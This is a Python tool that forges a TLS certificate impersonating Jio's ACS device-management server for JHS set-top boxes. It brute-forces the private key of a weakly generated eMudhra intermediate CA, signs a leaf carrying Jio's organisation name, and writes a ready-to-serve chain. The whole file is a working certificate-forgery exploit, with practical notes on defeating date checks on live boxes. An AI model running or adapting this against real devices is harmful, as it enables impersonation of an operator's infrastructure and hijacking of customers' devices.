#!/usr/bin/env python3
"""
forge_emudhra_chain.py — mint a forged ACS certificate for a Jio STB.

WHY
    Jio's real ACS cert chains to their private sub-CA (RILSUBCA01 -> RILROOTCA),
    which we cannot forge. JHS-series boxes validate the chain against the system
    trust store and do NOT pin RILROOTCA, so any chain anchored on a root the box
    already trusts is accepted.

    In October 2026 eight eMudhra intermediate CA private keys were disclosed. They
    were weakly generated (P-384 scalars of 4, 56, 66, 115, 155, 156, 230, 237),
    so anyone can recompute them from the public certificate. One of those
    intermediates is cross-signed by Sectigo's "AAA Certificate Services" root,
    which is present in frozen pre-2021 trust stores -- exactly what an embedded
    box with a 2024 system image has.

WHAT IT DOES
    1. Fetches the compromised intermediate (or reads a local copy of it).
    2. Brute-forces the scalar d in 1..255 against its P-384 public key.
    3. Signs a leaf for --host with that key.
    4. Writes one PEM file: leaf + intermediate + leaf private key, which is what
       pass_front.py's ssl.SSLContext.load_cert_chain() wants.

USAGE
    pip install cryptography
    python3 jhs/forge_emudhra_chain.py

    --host NAME         subject/SAN for the leaf        (default acs.oss.jio.com)
    --out PATH          output chain file               (default /tmp/forged_chain.pem)
    --int-pem PATH      use a local intermediate cert instead of fetching
    --start YYYY-MM-DD  leaf notBefore (default: intermediate notBefore + 1 day)
    --end   YYYY-MM-DD  leaf notAfter  (default: intermediate notAfter - 1 day)

    NOTE ON DATES: keep the leaf INSIDE the intermediate's validity window. A box
    with a stale RTC (common after cold power-cycles with no NTP) rejects a leaf
    whose notBefore is in its future with SSLV3_ALERT_CERTIFICATE_EXPIRED. Widening
    the leaf to span the intermediate's whole window is what finally worked.
"""
import argparse
import datetime
import socket
import ssl
import sys

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
except ImportError:
    sys.exit("This script needs the 'cryptography' package: pip install cryptography")

# Public test host maintained by the researchers; it serves a chain built from the
# compromised intermediate so anyone can pull it down.
TEST_HOST = "dv-g3b-aaa-emudhra.we-have-a-problem.com"
TEST_PORT = 443
# Published scalar for EM DV TLS CA - G3B. Cross-check only, not used for recovery.
EXPECTED_D = 156


def _aware(value):
    """Return a UTC-aware datetime regardless of old/new cryptography versions."""
    return value if value.tzinfo else value.replace(tzinfo=datetime.timezone.utc)


def not_before(cert):
    return _aware(getattr(cert, "not_valid_before_utc", cert.not_valid_before))


def not_after(cert):
    return _aware(getattr(cert, "not_valid_after_utc", cert.not_valid_after))


def fetch_intermediate():
    """Return the intermediate from the public test host's chain."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with ctx.wrap_socket(
        socket.create_connection((TEST_HOST, TEST_PORT), timeout=20), server_hostname=TEST_HOST
    ) as s:
        try:
            chain = s.get_verified_chain()  # Python 3.13+
        except AttributeError:
            return fetch_intermediate_openssl()
        if not chain or len(chain) < 2:
            # Peer sent no intermediate; try the openssl s_client route.
            return fetch_intermediate_openssl()
        # get_verified_chain() hands back DER-encoded bytes, not Certificate
        # objects -- parse the intermediate (entry [1]) before returning it.
        return x509.load_der_x509_certificate(chain[1])


def fetch_intermediate_openssl():
    """Python < 3.13 fallback: shell out to openssl s_client -showcerts.

    Openssl ships with Git for Windows, so this works everywhere the guide's
    tooling already runs.
    """
    import re
    import subprocess

    cmd = [
        "openssl", "s_client",
        "-connect", f"{TEST_HOST}:{TEST_PORT}",
        "-servername", TEST_HOST,
        "-showcerts",
    ]
    try:
        out = subprocess.run(
            cmd, input="", capture_output=True, text=True, timeout=60, check=False
        ).stdout
    except FileNotFoundError:
        sys.exit(
            "This Python is too old to read the chain and 'openssl' was not found.\n"
            f"Save the intermediate manually: openssl s_client -connect {TEST_HOST}:443 "
            "-showcerts\nthen pass the second cert to --int-pem."
        )
    certs = re.findall(r"-----BEGIN CERTIFICATE-----\n.*?-----END CERTIFICATE-----", out, re.S)
    if len(certs) < 2:
        sys.exit(
            "Could not retrieve the intermediate certificate from "
            f"{TEST_HOST}:{TEST_PORT}.\nSave it manually: openssl s_client -connect "
            f"{TEST_HOST}:443 -showcerts\nthen pass the second cert to --int-pem."
        )
    # certificates[0] is the leaf; certificates[1] is the compromised intermediate.
    return x509.load_pem_x509_certificate(certs[1].encode())


def recover_scalar(int_pub):
    """The compromised keys are scalars < 256; recover by brute force."""
    target = int_pub.public_numbers()
    for d in range(1, 256):
        cand = ec.derive_private_key(d, ec.SECP384R1()).public_key().public_numbers()
        if cand.x == target.x and cand.y == target.y:
            return d
    return None


def mint_leaf(int_cert, int_key, host, not_before, not_after):
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    leaf = (
        x509.CertificateBuilder()
        .subject_name(
            x509.Name(
                [
                    x509.NameAttribute(NameOID.COUNTRY_NAME, "IN"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Jio Platforms Ltd"),
                    x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "RJIL"),
                    x509.NameAttribute(NameOID.COMMON_NAME, host),
                ]
            )
        )
        .issuer_name(int_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        # SHA-384 to match the intermediate's own signature algorithm.
        .sign(int_key, hashes.SHA384())
    )
    return leaf, leaf_key


def main():
    ap = argparse.ArgumentParser(description="Forge an ACS cert signed by the weak eMudhra key")
    ap.add_argument("--host", default="acs.oss.jio.com")
    ap.add_argument("--out", default="/tmp/forged_chain.pem")
    ap.add_argument("--int-pem", default=None, help="local PEM of the compromised intermediate")
    ap.add_argument("--start", default=None, help="YYYY-MM-DD (default: int notBefore + 1d)")
    ap.add_argument("--end", default=None, help="YYYY-MM-DD (default: int notAfter - 1d)")
    args = ap.parse_args()

    if args.int_pem:
        int_cert = x509.load_pem_x509_certificate(open(args.int_pem, "rb").read())
    else:
        print(f"[*] fetching intermediate from {TEST_HOST}:{TEST_PORT} ...")
        int_cert = fetch_intermediate()

    int_nb = not_before(int_cert)
    int_na = not_after(int_cert)
    print(f"[*] intermediate : {int_cert.subject.rfc4514_string()}")
    print(f"[*] its validity : {int_nb} -> {int_na}")
    print(f"[*] its sig alg  : {int_cert.signature_algorithm_oid.dotted_string}")

    d = recover_scalar(int_cert.public_key())
    if d is None:
        sys.exit(
            "[!] scalar not found in 1..255 -- this intermediate is not one of the\n"
            "    compromised eight, or the wrong cert was pulled."
        )
    print(f"[+] RECOVERED private key: d = {d}")
    if d == EXPECTED_D:
        print(f"[+] matches the published value for EM DV TLS CA - G3B ({EXPECTED_D})")
    int_key = ec.derive_private_key(d, ec.SECP384R1())

    def parse_date(s, default):
        if not s:
            return default
        return datetime.datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc)

    nb = parse_date(args.start, int_nb + datetime.timedelta(days=1))
    na = parse_date(args.end, int_na - datetime.timedelta(days=1))
    if not (int_nb < nb < na < int_na):
        sys.exit(
            f"[!] leaf window {nb} -> {na} is not inside the intermediate's validity.\n"
            "    Any client that checks intermediate dates will reject it."
        )

    leaf, leaf_key = mint_leaf(int_cert, int_key, args.host, nb, na)

    # Sanity-check the signature chain before handing it to a live box.
    verifier = int_cert.public_key()
    verifier.verify(
        leaf.signature, leaf.tbs_certificate_bytes, ec.ECDSA(hashes.SHA384())
    )

    lp = leaf.public_bytes(serialization.Encoding.PEM).decode()
    ip = int_cert.public_bytes(serialization.Encoding.PEM).decode()
    kp = leaf_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ).decode()

    with open(args.out, "w") as f:
        f.write(lp + ip + kp)

    print(f"[+] leaf CN={args.host} SAN={args.host} valid {nb} -> {na}")
    print(f"[+] chain written to {args.out}  (leaf + intermediate + key)")
    print(f"[+] serve it with:  TLS_CERT={args.out} ./jhs/run_acs.sh")
    print()
    print("Reminder: this works only because the box's trust store contains Sectigo")
    print("AAA Certificate Services and checks neither revocation nor CT. Browsers")
    print("blocklist these intermediates; embedded devices never got that update.")


if __name__ == "__main__":
    main()
